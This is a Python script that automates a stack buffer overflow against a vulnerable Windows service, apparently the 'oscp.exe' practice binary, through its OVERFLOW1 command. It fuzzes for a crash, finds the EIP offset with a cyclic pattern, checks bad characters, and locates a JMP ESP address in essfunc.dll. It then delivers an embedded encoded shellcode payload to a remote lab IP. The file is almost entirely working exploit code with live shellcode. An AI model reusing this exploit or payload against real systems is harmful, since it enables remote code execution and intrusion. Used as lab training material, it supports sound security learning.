import threading
from string import ascii_uppercase, ascii_lowercase, digits
from radare import Program
from find_badchars import FindBadchars

def pattern_gen(length):
    pattern = ""
    for upper in ascii_uppercase:
        for lower in ascii_lowercase:
            for digit in digits:
                if len(pattern) < length:
                    pattern += upper + lower + digit

                else:
                    out = pattern[:length]
                    return out

    return pattern[:length]

def pattern_search(search_pattern):
    needle = search_pattern

    try:
        if needle.startswith("0x"):
            needle = needle[2:]
            needle = bytearray.fromhex(needle).decode("ascii")
            needle = needle[::-1]
    except (ValueError, TypeError) as e:
        raise

    haystack = ""
    for upper in ascii_uppercase:
        for lower in ascii_lowercase:
            for digit in digits:
                haystack += upper + lower + digit
                found_at = haystack.find(needle)
                if found_at > -1:
                    return found_at


program = Program("C:\\linux_shared\\oscp.exe", ["-d", "-2"], "192.168.1.21", 1337)

threading.Thread(target=program.run_program()).start()
threading.Thread(target=program.fuzz("OVERFLOW1 ", "\x41", 1000)).start()

if not program.detect_bof(0x41414141):
    print("[ - ] BOF is not successfuly used.")
    exit(1)
program.restart()

pattern = pattern_gen(program.crashed_counter)

threading.Thread(target=program.run_program()).start()
threading.Thread(target=program.exploit("OVERFLOW1 ", pattern, "", "", b'', "")).start()

current_eip = program.get_register_value_as_string("eip")

offset = pattern_search(current_eip)
new_eip = 4*"B"


program.restart()

threading.Thread(target=program.run_program()).start()
threading.Thread(target=program.exploit("OVERFLOW1 ", "\x41"*offset, new_eip, 16*"\x90", b'', "")).start()

current_eip = program.get_register_value("eip")

if not program.successfuly_overwrited(0x42424242):
    print("[ - ] BOF is not successfuly overwritten with BBBB.")
    exit(1)

find_bad_chars = FindBadchars("OVERFLOW1 ", offset, new_eip, program, "192.168.1.21", 1337)
bad_chars = find_bad_chars.find_badchars()

print("[ * ] All badchars are found!:\t", bad_chars)

int_badchars = []
for char in bad_chars:
    int_badchars.append(ord(char))

esp = program.get_jmp_esp_addr("C:\\linux_shared\\essfunc.dll",int_badchars)


buf = b""
buf += b"\xba\x80\x4c\x39\x36\xd9\xc8\xd9\x74\x24\xf4\x5b\x2b"
buf += b"\xc9\xb1\x52\x31\x53\x12\x03\x53\x12\x83\x6b\xb0\xdb"
buf += b"\xc3\x97\xa1\x9e\x2c\x67\x32\xff\xa5\x82\x03\x3f\xd1"
buf += b"\xc7\x34\x8f\x91\x85\xb8\x64\xf7\x3d\x4a\x08\xd0\x32"
buf += b"\xfb\xa7\x06\x7d\xfc\x94\x7b\x1c\x7e\xe7\xaf\xfe\xbf"
buf += b"\x28\xa2\xff\xf8\x55\x4f\xad\x51\x11\xe2\x41\xd5\x6f"
buf += b"\x3f\xea\xa5\x7e\x47\x0f\x7d\x80\x66\x9e\xf5\xdb\xa8"
buf += b"\x21\xd9\x57\xe1\x39\x3e\x5d\xbb\xb2\xf4\x29\x3a\x12"
buf += b"\xc5\xd2\x91\x5b\xe9\x20\xeb\x9c\xce\xda\x9e\xd4\x2c"
buf += b"\x66\x99\x23\x4e\xbc\x2c\xb7\xe8\x37\x96\x13\x08\x9b"
buf += b"\x41\xd0\x06\x50\x05\xbe\x0a\x67\xca\xb5\x37\xec\xed"
buf += b"\x19\xbe\xb6\xc9\xbd\x9a\x6d\x73\xe4\x46\xc3\x8c\xf6"
buf += b"\x28\xbc\x28\x7d\xc4\xa9\x40\xdc\x81\x1e\x69\xde\x51"
buf += b"\x09\xfa\xad\x63\x96\x50\x39\xc8\x5f\x7f\xbe\x2f\x4a"
buf += b"\xc7\x50\xce\x75\x38\x79\x15\x21\x68\x11\xbc\x4a\xe3"
buf += b"\xe1\x41\x9f\xa4\xb1\xed\x70\x05\x61\x4e\x21\xed\x6b"
buf += b"\x41\x1e\x0d\x94\x8b\x37\xa4\x6f\x5c\xf8\x91\x6e\xbb"
buf += b"\x90\xe3\x70\xc2\xdb\x6d\x96\xae\x0b\x38\x01\x47\xb5"
buf += b"\x61\xd9\xf6\x3a\xbc\xa4\x39\xb0\x33\x59\xf7\x31\x39"
buf += b"\x49\x60\xb2\x74\x33\x27\xcd\xa2\x5b\xab\x5c\x29\x9b"
buf += b"\xa2\x7c\xe6\xcc\xe3\xb3\xff\x98\x19\xed\xa9\xbe\xe3"
buf += b"\x6b\x91\x7a\x38\x48\x1c\x83\xcd\xf4\x3a\x93\x0b\xf4"
buf += b"\x06\xc7\xc3\xa3\xd0\xb1\xa5\x1d\x93\x6b\x7c\xf1\x7d"
buf += b"\xfb\xf9\x39\xbe\x7d\x06\x14\x48\x61\xb7\xc1\x0d\x9e"
buf += b"\x78\x86\x99\xe7\x64\x36\x65\x32\x2d\x46\x2c\x1e\x04"
buf += b"\xcf\xe9\xcb\x14\x92\x09\x26\x5a\xab\x89\xc2\x23\x48"
buf += b"\x91\xa7\x26\x14\x15\x54\x5b\x05\xf0\x5a\xc8\x26\xd1"


program.restart()
threading.Thread(target=program.run_program()).start()
threading.Thread(target=program.exploit("OVERFLOW1 ", "\x41"*offset, esp, "", buf, "", _ip = "10.10.21.223")).start()
